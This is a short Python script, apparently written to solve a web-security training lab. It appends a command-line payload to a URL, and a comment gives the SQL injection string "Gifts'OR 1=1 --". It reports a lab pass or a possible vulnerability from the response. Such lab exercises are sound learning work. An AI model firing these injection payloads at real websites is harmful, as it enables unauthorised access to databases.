
import requests
import sys

try:
    
    url = sys.argv[1]
    payload = sys.argv[2]
    # payload="Gifts'OR 1=1 --"
    response = requests.get(url+ payload)
    if response.status_code == 200:
        if "Congratulations" in response.text:
            print("Lab passed :)")
        else:
            print("Failed passing Lab ")  
    elif response.status_code==500:
        print("App maybe vurnable , verify your payload")
    else:
        print("Failed to retrieve data", response.status_code)
except IndexError:
    print(f"[.]Usage {sys.argv[0]} <url> <payload>")
    sys.exit(1)
except:
    print("Error in App ")


